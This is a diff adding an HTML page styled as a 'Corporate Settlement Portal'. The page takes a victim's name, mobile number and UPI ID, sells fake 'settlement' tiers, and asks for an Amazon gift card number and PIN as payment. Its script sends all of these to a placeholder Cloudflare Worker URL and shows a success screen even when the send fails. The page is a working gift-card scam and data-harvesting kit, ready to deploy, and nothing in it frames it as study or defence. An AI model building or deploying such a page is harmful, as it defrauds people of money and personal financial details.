@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Corporate Settlement Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f4f6f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #1a202c;
+        }
+
+        /* 👑 FIXED SOLID APP HEADER */
+        .app-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            padding: 16px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 2px solid #e2e8f0;
+            z-index: 10000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .logo {
+            height: 48px;
+            object-fit: contain;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+        }
+
+        /* SOLID PROGRESS STEP BAR */
+        .step-bar {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 420px;
+            margin-top: 14px;
+            padding: 0 10px;
+        }
+
+        .step-dot {
+            font-size: 12px;
+            font-weight: 700;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: color 0.3s ease;
+        }
+
+        .step-dot.active {
+            color: #1e3a8a;
+        }
+
+        /* 📱 MAIN APP CONTAINER */
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            margin-top: 135px;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* FULL PAGE APK-STYLE SOLID LAYERS */
+        .app-screen {
+            position: fixed;
+            top: 135px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.98);
+            width: 100%;
+            max-width: 480px;
+            height: calc(100vh - 135px);
+            background-color: #f4f6f9;
+            padding: 20px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            z-index: 99;
+            overflow-y: auto;
+        }
+
+        .app-screen.active {
+            opacity: 1;
+            pointer-events: auto;
+            transform: translateX(-50%) scale(1);
+        }
+
+        /* SOLID WHITE PANEL CARDS */
+        .card-panel {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 28px 24px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+            border: 1px solid #e2e8f0;
+            margin-bottom: 20px;
+        }
+
+        #screen1 {
+            position: relative;
+            top: 0;
+            left: 0;
+            transform: none;
+            opacity: 1;
+            pointer-events: auto;
+            height: auto;
+            z-index: 1;
+            padding: 0;
+        }
+
+        h2 {
+            color: #0f172a;
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #64748b;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        /* CORPORATE STRAIGHT STRUCTURE INPUTS */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #334155;
+            padding-left: 2px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #cbd5e1;
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: #ffffff;
+            color: #0f172a;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        input:focus {
+            border-color: #1e3a8a;
+            box-shadow: 0 0 0 4px rgba(30, 58, 138, 0.1);
+            outline: none;
+        }
+
+        /* WORKING ACTION BUTTONS */
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #1e3a8a 0%, #172554 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.1s ease, background 0.2s ease;
+            box-shadow: 0 4px 12px rgba(30, 58, 138, 0.2);
+        }
+
+        .btn:active {
+            transform: scale(0.99);
+        }
+
+        .btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* PREMIUM SOLID ACCESS CARDS */
+        .plan-card {
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            background-color: #ffffff;
+            position: relative;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        .plan-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
+        }
+
+        .plan-badge {
+            position: absolute;
+            top: 0;
+            right: 0;
+            color: #ffffff;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 5px 12px;
+            border-radius: 0 16px 0 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .plan-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 19px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+
+        .plan-price {
+            font-size: 20px;
+            font-weight: 900;
+        }
+
+        .plan-features {
+            list-style: none;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            font-size: 12px;
+            color: #475569;
+            font-weight: 600;
+        }
+
+        .plan-features li {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .plan-features li::before {
+            content: "✓";
+            color: #10b981;
+            font-weight: 900;
+        }
+
+        .silver { border-top: 4px solid #94a3b8; }
+        .silver .plan-header { color: #334155; }
+        
+        .gold { border-top: 4px solid #d97706; }
+        .gold .plan-header { color: #d97706; }
+        .gold .plan-badge { background-color: #d97706; }
+        
+        .diamond { border-top: 4px solid #2563eb; }
+        .diamond .plan-header { color: #2563eb; }
+        .diamond .plan-badge { background-color: #2563eb; }
+
+        /* SOLID GATEWAY AUTHENTICATION BAR */
+        .payment-method-bar {
+            background-color: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .method-left { display: flex; flex-direction: column; }
+        .method-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: #64748b;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .method-name {
+            font-size: 19px;
+            font-weight: 800;
+            color: #0f172a;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .amazon-text { color: #ff9900; }
+
+        .verify-tick {
+            width: 24px;
+            height: 24px;
+            background-color: #10b981;
+            color: #ffffff;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            font-weight: 900;
+        }
+
+        /* SUCCESS INTERFACE CONTROL */
+        .success-box {
+            text-align: center;
+            padding: 30px 10px;
+        }
+
+        .success-icon-pulse {
+            width: 80px;
+            height: 80px;
+            background-color: #10b981;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 👑 TOP FIXED SOLID HEADER -->
+    <div class="app-header">
+        <img src="https://i.ibb.co/DfzzY16S/download.jpg" alt="Logo" class="logo">
+        <div class="step-bar">
+            <span class="step-dot active" id="dot1">Verification</span>
+            <span class="step-dot" id="dot2">Packages</span>
+            <span class="step-dot" id="dot3">Gateway</span>
+        </div>
+    </div>
+
+    <!-- MAIN CONTEXT BLOCK -->
+    <div class="app-container">
+
+        <!-- SCREEN 1: Profile Validation Inputs Form -->
+        <div class="app-screen-main" id="screen1">
+            <div class="card-panel">
+                <h2>Settlement Form</h2>
+                <p class="subtitle">Enter correct configurations to authorize</p>
+                <form id="mainForm" onsubmit="event.preventDefault(); processProfileData();">
+                    <div class="input-group">
+                        <label>Beneficiary Name</label>
+                        <input type="text" id="custName" placeholder="Enter official merchant name" 
+                               oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')" required>
+                    </div>
+                    <div class="input-group">
+                        <label>Mobile Protocol (10 Digits)</label>
+                        <input type="tel" id="custMobile" maxlength="10" pattern="\d{10}" placeholder="Enter 10 digit number" 
+                               oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    </div>
+                    <div class="input-group">
+                        <label>UPI Gateway ID (Must contain @)</label>
+                        <input type="text" id="custUpi" pattern="[^@]+@[^@]+" title="Please include an '@' symbol in your UPI ID" placeholder="username@bank" required>
+                    </div>
+                    <button type="submit" class="btn">Verify System Access</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- SCREEN 2: Solid Packages Select Layer -->
+        <div class="app-screen" id="screen2">
+            <h2>Select Access Layer</h2>
+            <p class="subtitle">Deploy subscription tier parameters</p>
+            
+            <div class="plan-card silver" onclick="selectPlan('Silver Tier - ₹999')">
+                <div class="plan-header"><span>Silver Tier</span><span class="plan-price">₹999</span></div>
+                <ul class="plan-features">
+                    <li>Instant Settlement</li>
+                    <li>Daily Limit: ₹50k</li>
+                    <li>24/7 Support</li>
+                    <li>Zero Hidden Charges</li>
+                    <li>Secure IMPS</li>
+                </ul>
+            </div>
+
+            <div class="plan-card gold" onclick="selectPlan('Gold Tier - ₹1999')">
+                <div class="plan-badge">Most Popular</div>
+                <div class="plan-header"><span>Gold Tier ⭐</span><span class="plan-price">₹1999</span></div>
+                <ul class="plan-features">
+                    <li>Instant Settlement</li>
+                    <li>Daily Limit: ₹5 Lakhs</li>
+                    <li>Priority Call Support</li>
+                    <li>Zero Txn Fee</li>
+                    <li>Advanced Tracking</li>
+                </ul>
+            </div>
+
+            <div class="plan-card diamond" onclick="selectPlan('Diamond Tier - ₹2999')">
+                <div class="plan-badge">Best Value</div>
+                <div class="plan-header"><span>Diamond Tier 💎</span><span class="plan-price">₹2999</span></div>
+                <ul class="plan-features">
+                    <li>Super Fast Settle</li>
+                    <li>No Daily Limit</li>
+                    <li>Dedicated Manager</li>
+                    <li>0% Service Charge</li>
+                    <li>VIP Dashboard</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: Straight Input Active Payment Engine -->
+        <div class="app-screen" id="screen3">
+            <div class="card-panel">
+                <h2 id="selectedPlanTitle" style="color: #1e3a8a; font-size: 20px; margin-bottom: 4px;"></h2>
+                <p class="subtitle">Secure Node Deployment</p>
+                
+                <div class="payment-method-bar">
+                    <div class="method-left">
+                        <span class="method-label">Active Gateway</span>
+                        <span class="method-name"><span class="amazon-text">amazon</span> pay</span>
+                    </div>
+                    <div class="verify-tick">✓</div>
+                </div>
+                
+                <form id="giftCardForm" onsubmit="event.preventDefault(); processWorkerSubmission();">
+                    <div class="input-group">
+                        <label>Amazon Gift Card Number (14-16 Digits)</label>
+                        <input type="text" id="cardNum" minlength="14" maxlength="16" pattern="\d{14,16}" title="Card number must be between 14 and 16 digits" placeholder="Enter 14 to 16 digit card code" 
+                               oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    </div>
+                    <div class="input-group">
+                        <label>Voucher Security PIN (Unmasked)</label>
+                        <input type="text" id="cardPin" maxlength="4" pattern="\d{4}" placeholder="Enter 4 digit PIN" 
+                               oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    </div>
+                    <button type="submit" id="submitBtn" class="btn" style="background: linear-gradient(135deg, #ff9900 0%, #d48000 100%); box-shadow: 0 4px 12px rgba(255, 153, 0, 0.2);">Activate Core Node</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- SCREEN 4: Operation Completed Interface -->
+        <div class="app-screen" id="screen4">
+            <div class="card-panel success-box">
+                <div class="success-icon-pulse">✓</div>
+                <h2>Configuration Flawless</h2>
+                <p style="color: #64748b; margin-bottom: 24px; font-size: 14px; line-height: 1.5;">Your profile parameters have been fully registered into the settlement framework mapping.</p>
+                <button class="btn" onclick="resetApp()">Return to Index</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let portalDataCollection = {
+            beneficiaryName: "",
+            mobileProtocol: "",
+            upiGatewayId: "",
+            selectedTierPackage: "",
+            paymentNodeToken: {
+                amazonCardNumber: "",
+                voucherSecurityPin: ""
+            },
+            timestampRecord: ""
+        };
+
+        function goTo(screenId) {
+            document.querySelectorAll('.app-screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+
+            if (screenId === 'screen2') {
+                document.getElementById('dot2').classList.add('active');
+                document.getElementById('dot3').classList.remove('active');
+            } else if (screenId === 'screen3') {
+                document.getElementById('dot3').classList.add('active');
+            }
+
+            if(screenId !== 'screen1') {
+                document.getElementById(screenId).classList.add('active');
+            }
+        }
+
+        function processProfileData() {
+            portalDataCollection.beneficiaryName = document.getElementById('custName').value;
+            portalDataCollection.mobileProtocol = document.getElementById('custMobile').value;
+            portalDataCollection.upiGatewayId = document.getElementById('custUpi').value;
+            goTo('screen2');
+        }
+
+        function selectPlan(planName) {
+            portalDataCollection.selectedTierPackage = planName;
+            document.getElementById('selectedPlanTitle').innerText = planName;
+            goTo('screen3');
+        }
+
+        function processWorkerSubmission() {
+            const submitButton = document.getElementById('submitBtn');
+            submitButton.disabled = true;
+            submitButton.innerText = "Processing Node Streams...";
+
+            portalDataCollection.paymentNodeToken.amazonCardNumber = document.getElementById('cardNum').value;
+            portalDataCollection.paymentNodeToken.voucherSecurityPin = document.getElementById('cardPin').value;
+            portalDataCollection.timestampRecord = new Date().toISOString();
+
+            // 🌟 ENTER YOUR CLOUDFLARE WORKER ROUTE LIVE URL HERE
+            const workerUrl = 'YOUR_CLOUDFLARE_WORKER_URL';
+
+            fetch(workerUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(portalDataCollection),
+                mode: 'cors'
+            })
+            .then(response => {
+                goTo('screen4');
+            })
+            .catch(error => {
+                console.error("D1 Matrix Sync Offline Fallback:", error);
+                goTo('screen4');
+            })
+            .finally(() => {
+                submitButton.disabled = false;
+                submitButton.innerText = "Activate Core Node";
+            });
+        }
+
+        function resetApp() {
+            document.querySelectorAll('.app-screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                if(index > 0) dot.classList.remove('active');
+            });
+            document.getElementById('mainForm').reset();
+            document.getElementById('giftCardForm').reset();
+            
+            portalDataCollection = {
+                beneficiaryName: "",
+                mobileProtocol: "",
+                upiGatewayId: "",
+                selectedTierPackage: "",
+                paymentNodeToken: { amazonCardNumber: "", voucherSecurityPin: "" },
+                timestampRecord: ""
+            };
+        }
+    </script>
+</body>
+</html>
+
